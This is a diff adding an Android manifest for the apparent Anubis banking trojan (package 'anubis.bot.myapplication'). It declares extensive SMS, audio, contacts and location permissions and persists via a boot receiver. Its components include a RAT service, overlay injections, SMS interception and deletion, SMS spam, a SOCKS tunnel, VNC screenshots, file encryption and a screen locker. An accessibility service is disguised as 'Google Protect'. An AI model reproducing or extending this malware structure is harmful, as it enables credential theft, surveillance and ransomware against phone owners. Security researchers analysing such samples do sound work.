@@ -1,0 +1,312 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="anubis.bot.myapplication">
+
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <application
+        android:name=".MainApplication"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="nameApp"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        <activity
+            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="12211000" />
+        <meta-data
+            android:name="android.support.VERSION"
+            android:value="26.1.0" />
+        <meta-data
+            android:name="android.arch.lifecycle.VERSION"
+            android:value="27.0.0-SNAPSHOT" />
+
+        <activity android:name=".Activity.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name=".Receiver.ReceiverMms"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".Receiver.RecieverPushService"
+            android:enabled="true"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+
+        <activity android:name=".SendSms">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".ServiceHeadlessSmsSend"
+            android:exported="true"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+        <service
+            android:name=".ServiceInjections"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".ServiceGeolocationNetwork"
+            android:enabled="true"
+            android:exported="true" />
+
+        <receiver android:name=".Receiver.ReceiverBoot">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE" />
+
+                <category android:name="android.intent.category.HOME" />
+
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.DREAMING_STOPPED" />
+            </intent-filter>
+        </receiver>
+        <!--
+        ADMIN
+        <receiver
+            android:name=".API.Admin.ReceiverDeviceAdmin"
+            android:label=""
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@layout/r_l" />
+            <intent-filter android:priority="111">
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+        ADMIN
+        -->
+        <activity
+            android:name=".Activity.ActivityPermissions"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:theme="@android:style/Theme.NoDisplay" />
+        <activity
+            android:name=".API.Screenshot.ActivityScreenshot"
+            android:icon="@drawable/im"
+            android:label="" />
+        <activity
+            android:name=".Activity.ActivityInjection"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+        <!-- ADMIN  <activity android:name=".API.Admin.ActivityAdmin" android:excludeFromRecents="true" android:icon="@drawable/im" android:theme="@android:style/Theme.NoDisplay" /> ADMIN -->
+        <activity
+            android:name=".Activity.ActivityGetNumber"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:launchMode="singleTask" />
+        <activity
+            android:name=".Activity.ActivityAlert1"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+        <activity
+            android:name=".Activity.ActivityGetSMS"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+        <activity
+            android:name=".Activity.ActivityAlert2"
+            android:icon="@drawable/im"
+            android:label="" />
+        <activity
+            android:name=".Activity.ActivityStartUSSD"
+            android:excludeFromRecents="true"
+            android:label=""
+            android:launchMode="singleTask" />
+        <activity
+            android:name=".Activity.ActivityPushInjection"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+        <activity
+            android:name=".Activity.ActivityOpenURL"
+            android:excludeFromRecents="true"
+            android:icon="@drawable/im"
+            android:label=""
+            android:launchMode="singleTask" />
+
+        <receiver
+            android:name=".Receiver.ReceiverAlarm"
+            android:enabled="true"
+            android:exported="false" />
+
+        <service
+            android:name=".ServiceCommands"
+            android:exported="false" />
+        <service
+            android:name=".StartWhileGlobal"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".ServiceGeolocationGPS"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".ServiceDeleteSMS"
+            android:exported="false" />
+        <service
+            android:name=".ServiceModuleNotification"
+            android:exported="false" />
+        <service
+            android:name=".ServiceToast"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".ServicePlayProtectToast"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".ServiceAccessibility"
+            android:label="Google Protect"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/serviceconfig" />
+        </service>
+        <service
+            android:name=".StartWhileRequest"
+            android:exported="false" />
+        <service
+            android:name=".API.Screenshot.ServiceScreenshot"
+            android:exported="true" />
+        <service
+            android:name=".API.Screenshot.ServiceSendRequestImageVNC"
+            android:exported="false" />
+        <service
+            android:name=".API.Sound.ServiceStreamSound"
+            android:exported="false" />
+        <service
+            android:name=".ServiceRAT"
+            android:exported="false" />
+        <service
+            android:name=".ServiceFindFiles"
+            android:exported="false" />
+        <service
+            android:name=".ServiceCryptFiles"
+            android:exported="false" />
+
+        <activity
+            android:name=".Activity.ActivityScreenLocker"
+            android:icon="@drawable/im"
+            android:label="" />
+
+        <service
+            android:name=".API.Sound.ServiceRecordSound"
+            android:exported="false" />
+
+        <activity
+            android:name=".Activity.ActivityAccessibility"
+            android:icon="@drawable/im"
+            android:label="" />
+        <activity
+            android:name=".Activity.ActivityPlayProtect"
+            android:icon="@drawable/im"
+            android:label="" />
+
+        <service
+            android:name=".API.Spam.ServiceSpamSMS"
+            android:exported="false" />
+        <service
+            android:name=".API.Spam.ServiceSenderSpamSMS"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".socks.ServiceForwardingTunel"
+            android:exported="false" />
+
+        <activity
+            android:name=".Activity.LookScreen"
+            android:label=""
+            android:icon="@drawable/im"/>
+
+        <service
+            android:name=".ServiceLookScreen"
+            android:exported="false"/>
+
+        <service
+            android:name=".ServicePedometer"/>
+    </application>
+
+</manifest>
